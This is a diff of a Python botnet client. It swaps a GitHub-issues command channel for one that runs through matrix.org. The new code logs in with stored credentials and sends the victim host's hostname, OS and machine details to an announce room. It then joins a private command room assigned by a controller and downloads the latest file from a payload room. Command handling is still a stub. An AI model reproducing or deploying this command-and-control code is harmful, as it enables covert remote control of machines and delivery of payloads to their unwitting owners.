@@ -1,133 +1,139 @@
-import requests
-import time
-import socket
-import os
-import platform
-import uuid
-from dotenv import load_dotenv
 import json
-import random
-from datetime import datetime
-from queries import *
+import platform
+import socket
+import uuid
+from matrix_client.client import MatrixClient, Room
+from matrix_client.api import MatrixRequestError
+import requests
+from requests.exceptions import MissingSchema
+import os
+import sys
+from dotenv import load_dotenv
+
+load_dotenv()
+USER_NAME = os.getenv('USER_NAME')  
+PASSWORD = os.getenv('PASSWORD')
+ROOM_ID = os.getenv('ROOM_ID')
+PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
+MATRIX_HOMESERVER = "https://matrix.org"
+MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"
 
 class Bot:
-    def __init__(self, owner, repo, token):
-        self.owner = owner
-        self.repo = repo
-        self.token = token
-        self.bot_id = str(uuid.uuid4())[:8]  # Generate unique bot ID
-        self.last_checked_issue = 0
-        self.poll_interval = random.randint(30, 60)  # Random polling interval
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json',
-            'Authorization': f'token {token}'
-        }
-        
-        self.commands = {
-            'exit': self.cmd_exit
-        }
+    access_token: str
+    announce_room: Room
+    command_room: Room
     
-    def get_system_info(self):
-        return {
-            'hostname': socket.gethostname(),
-            'platform': platform.system(),
-            'platform_version': platform.version(),
-            'machine': platform.machine(),
-            'bot_id': self.bot_id,
-            'python_version': platform.python_version()
-        }
+    announce_listener: uuid.UUID
+    command_listener: uuid.UUID
     
-    def register_bot(self):
-        print(f"registering bot {self.bot_id}")
-        system_info = self.get_system_info()
-        title = f"Bot Registration: {self.bot_id}"
-        body = f"Bot checking in:\n```json\n{json.dumps(system_info, indent=2)}\n```"
-        self.create_issue(title, body)
+    def __init__(self):
+        self.bot_id = str(uuid.uuid4())
+        self.client = MatrixClient(MATRIX_HOMESERVER)
 
-    def create_issue(self, title, body):
-        url = f"https://api.github.com/repos/{self.owner}/{self.repo}/issues"
-        response = requests.post(
-            url,
-            json={"title": title, "body": body},
-            headers=self.headers
-        )
-        if response.status_code == 201:
-            issue_data = response.json()
-            print(f"created issue #{issue_data['number']}: {title}")
-            return issue_data['number']
-        else:
-            print(f"failed to create issue: {response.status_code}")
-    
-    def check_for_commands(self):
-        variables = {
-            "owner": self.owner,
-            "repo": self.repo,
-            "issueNumber": 1  # check issue #1 for commands
-        }
+    def login(self):
+        # login and sync
+        try:
+            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
+            print("[+] Logged in as controller.")
+        except MatrixRequestError as e:
+            print(e)
+            if e.code == 403:
+                print("Bad username or password.")
+                sys.exit(4)
+            else:
+                print("Check your sever details are correct.")
+                sys.exit(2)
+        except MissingSchema as e:
+            print("Bad URL format.")
+            print(e)
+            sys.exit(3)
+            
+    def join_room(self, roomid) -> Room:
+        # check if already joined, if not join the room
+        try:
+            room = self.client.rooms[roomid]
+            print(f"Already joined room: {room.display_name}")
+        except KeyError:
+            room = self.client.join_room(roomid)
+            print(f"Joined room: {room.display_name}")
+        return room
         
-        url = "https://api.github.com/graphql"
-        response = requests.post(
-            url,
-            json={"query": Q_CHECK_COMMANDS, "variables": variables},
-            headers=self.headers
+    def announce(self):
+        status = self.announce_room.send_text(
+            f"CONNECT:{self.get_system_info()}"
         )
-        if response.status_code == 200:
-            data = response.json()
-            if "data" in data and data["data"]["repository"]["issue"]:
-                issue = data["data"]["repository"]["issue"]
-                self.process_commands(issue["body"])
+        
+    def download_file(self, event, download_dir="downloads") -> str:
+        content = event["content"]
+        filename = content.get("body", "payload_file")
+        filepath = os.path.join(download_dir, filename)
+        os.makedirs(download_dir, exist_ok=True)
+        
+        # extract server and media ID from mxc URL
+        mxc_url = content['url']
+        durl = MATRIX_DOWNLOAD_PREFIX + mxc_url[6:]
+        
+        # download 
+        response = requests.get(durl, headers={"Authorization": f"Bearer {self.client.token}"})
+        response.raise_for_status()
+        
+        # save 
+        with open(filepath, 'wb') as f:
+            f.write(response.content)
+        
+        print(f"Downloaded file: {filepath}")
+        return filepath
+        
+    def download_payload(self):
+        payload_event = self.client.api.get_room_messages(
+            PAYLOAD_ROOM_ID,
+            "",
+            "b",
+            limit=1
+        )
+        self.download_file(payload_event["chunk"][0])
+        
+    def get_system_info(self) -> str:
+        return json.dumps({
+            "hostname": socket.gethostname(),
+            "platform": platform.system(),
+            "platform_version": platform.version(),
+            "machine": platform.machine(),
+            "bot_id": self.bot_id,
+            "python_version": platform.python_version()
+        })
+        
+    def on_announcement(self, room, event):
+        # not good that bot can see other bot's messages
+        msgbody: str = event["content"]["body"]
+        if not msgbody.startswith("RESOLVE"):
+            return
+        
+        botid, roomid = msgbody.removeprefix("RESOLVE ").split(":", 1)
+        if botid == self.bot_id:
+            self.command_room = self.join_room(roomid)
+            self.client.remove_listener(self.announce_listener)
+            self.command_listener = self.command_room.add_listener(self.on_command)
                 
-                for comment in issue["comments"]["nodes"]:
-                    comment_time = datetime.fromisoformat(comment["createdAt"].replace("Z", "+00:00"))
-                    comment_timestamp = comment_time.timestamp()
-                    
-                    if comment_timestamp > self.last_checked_issue:
-                        self.process_commands(comment["body"])
-                        self.last_checked_issue = comment_timestamp
-        else:
-            print(f"Failed to fetch issues: {response.status_code}")
-    
-    def process_commands(self, text):
-        print("processing commands")
-    
-    def execute_command(self, command, argument):
-        print(f"executing command: {command} with argument: {argument}")
-        
-        if command in self.commands:
-            response = self.commands[command](argument)
-            if response:
-                comment = f"Bot {self.bot_id} response to `{command}`:\n```\n{response}\n```"
-                self.create_issue_comment(1, comment)
-        else:
-            print(f"Unknown command: {command}")
-    
-    def cmd_exit(self, arg):
-        print("Received exit command. Shutting down...")
-        exit(0)
-    
+    def on_command(self, room, event):
+        msgbody: str = event["content"]["body"]
+        print(msgbody)
+
     def run(self):
-        print(f"starting bot {self.bot_id}")
-        self.register_bot()
+        self.login()
+        self.announce_room = self.join_room(ROOM_ID)
+        
+        self.announce_listener = self.announce_room.add_listener(self.on_announcement)
+        self.client.start_listener_thread()
+        
+        self.announce()
+        self.download_payload()
         
         while True:
-            try:
-                self.check_for_commands()
-                time.sleep(self.poll_interval)
-            except KeyboardInterrupt:
-                print("bot terminated by user.")
-                break
-            except Exception as e:
-                print(f"error in main loop: {e}")
-                time.sleep(self.poll_interval)
-
+            pass
+        
+        
 
 if __name__ == "__main__":
-    load_dotenv()
-    
-    bot = Bot(
-        os.getenv("GITHUB_NAME"),
-        os.getenv("GITHUB_REPO"),
-        os.getenv("GITHUB_KEY")
-    )
+    bot = Bot()
     bot.run()
